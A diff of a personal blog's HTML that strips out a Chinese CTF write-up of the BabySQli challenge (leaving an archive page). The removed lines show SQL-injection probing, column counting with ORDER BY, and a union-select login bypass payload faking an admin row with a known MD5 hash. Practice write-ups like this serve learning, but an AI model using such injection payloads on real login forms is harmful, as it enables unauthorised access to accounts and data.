@@ -17,25 +17,9 @@
   <meta name="description" content="BLOG">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>BUU每日一题023 - lll-nnnのblog</title>
+  <title>归档 - lll-nnnのblog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
-
-
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
-  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
-
-  
-    
-    
-      
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
-    
-  
-
-  
-    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
-  
 
 
 
@@ -63,7 +47,7 @@
 
 
 <body>
-  <header style="height: 70vh;">
+  <header style="height: 60vh;">
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand"
@@ -157,51 +141,14 @@
 </nav>
 
     <div class="banner intro-2" id="background" parallax=true
-         style="background: url('/img/llll.jpg') no-repeat center center;
+         style="background: url('/img/011.jpg') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="BUU每日一题023">
+            <span class="h2" id="subtitle" title="归档">
               
             </span>
-
-            
-              <div class="mt-3">
-  
-  
-    <span class="post-meta">
-      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-02-06 15:52" pubdate>
-        2021年2月6日 下午
-      </time>
-    </span>
-  
-</div>
-
-<div class="mt-1">
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-chart"></i>
-      267 字
-    </span>
-  
-
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-clock-fill"></i>
-      
-      
-      3
-       分钟
-    </span>
-  
-
-  
-  
-</div>
 
             
           </div>
@@ -214,94 +161,52 @@
 
   <main>
     
+      <div class="container nopadding-md">
+        <div class="py-5" id="board"
+          >
+          
+          <div class="container">
+            <div class="row">
+              <div class="col-12 col-md-10 m-auto">
+                
+
+<div class="list-group">
+  <p class="h4">共计 39 篇文章</p>
+  <hr>
+  
+  
+    
       
+      <p class="h5">2021</p>
+    
+    <a href="/2021/01/15/BUU001/" class="list-group-item list-group-item-action">
+      <span class="archive-post-title">BUU每日一题001</span>
+      <time style="float: right;">01-15</time>
+    </a>
+  
+</div>
 
-<div class="container-fluid">
-  <div class="row">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-md">
-      <div class="container nopadding-md" id="board-ctn">
-        <div class="py-5" id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">BUU每日一题023</h1>
-            
-            <div class="markdown-body">
-              <h2 id="二十三、"><a href="#二十三、" class="headerlink" title="二十三、"></a>二十三、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[GXYCTF2019]BabySQli<br><img src="https://ftp.bmp.ovh/imgs/2021/02/882964df2e56c968.png" srcset="/img/loading.gif">  </p>
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><code>name=admin&amp;pw=123</code>———–<code>wrong pass!</code><br><code>name=admin&#39;&amp;pw=123</code>———-<code>报错</code><br><code>name=admin&amp;pw=1&#39;</code>————<code>wrong pass!</code><br>说明<code>name</code>存在注入，<code>pw</code>不存在<br>在<code>search.php</code>页面源码注释中发现：<br><code>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</code><br>base32然后base64解码得到SQL语句<br><code>select * from user where username = &#39;$name&#39;</code><br><code>or、=、(、)</code>被过滤，但OR可以<br><code>admin&#39; Order by 4#</code>———<code>Error: Unknown column &#39;4&#39; in &#39;order clause&#39; </code>说明有三列<br><code>1&#39; union select 1,2,3#</code>看回显位，结果是<code>wrong user!</code><br>将1改为<code>&#39;admin&#39;</code>,还是wrong user；改到第二位，变成了wrong pass，说明admin在第二列       </p>
-<hr>
-<p>在BUU给的这道题的源码中<img src="https://ftp.bmp.ovh/imgs/2021/02/0eafd76c74fd6cb3.png" srcset="/img/loading.gif"><br><code>arr[1]==&#39;admin&#39;</code>那么<code>arr[2]</code>应该就是输入的pw吧<br>需要<code>md5($password) == $arr[2]</code><br>所以只要传入的pw的MD5等于第三位就行了 </p>
-<hr>
-<p>如果没有源码的提示，正确的思路应该是利用sql的特性：<code>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据</code>     </p>
-<h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>payload：<code>name=1&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;#</code>&amp;&amp;<code>pw=123</code><img src="https://ftp.bmp.ovh/imgs/2021/02/dee35a5c0bf7263c.png" srcset="/img/loading.gif">        </p>
-<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><code>sql特性</code>     </p>
-<blockquote>
-<p><img src="https://ftp.bmp.ovh/imgs/2021/02/0b5f477cb43f3a6c.png" srcset="/img/loading.gif"><br><img src="https://ftp.bmp.ovh/imgs/2021/02/0c57b06eb2a85b33.png" srcset="/img/loading.gif"></p>
-</blockquote>
 
-            </div>
-            <hr>
-            <div>
-              <div class="post-metas mb-3">
-                
-                
-                  <div class="post-meta">
-                    <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/wp/">wp</a>
-                    
-                  </div>
-                
+  <nav aria-label="navigation">
+    <span class="pagination" id="pagination">
+      <a class="extend prev" rel="prev" href="/archives/2021/page/3/"><i class="iconfont icon-arrowleft"></i></a><a class="page-number" href="/archives/2021/">1</a><a class="page-number" href="/archives/2021/page/2/">2</a><a class="page-number" href="/archives/2021/page/3/">3</a><span class="page-number current">4</span>
+    </span>
+  </nav>
+  
+  <script>
+    for (ele of document.getElementById("pagination").getElementsByTagName("a")) {
+      ele.href += '#board';
+    }
+  </script>
+
+
+
+
               </div>
-              
-                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
-              
-              
-                <div class="post-prevnext row">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2021/02/07/BUU024/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">BUU每日一题024</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2021/02/05/ctfhub/">
-                        <span class="hidden-mobile">Ctfhub</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
             </div>
-
-            
-          </article>
+          </div>
         </div>
       </div>
-    </div>
-    
-      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
-        <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-      </div>
-    
-  </div>
-</div>
-
-<!-- Custom -->
-
-
     
 
     
@@ -384,15 +289,9 @@
 
 
 
-  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
 
 
 
-  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
-
-
-
-  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
 
 
 
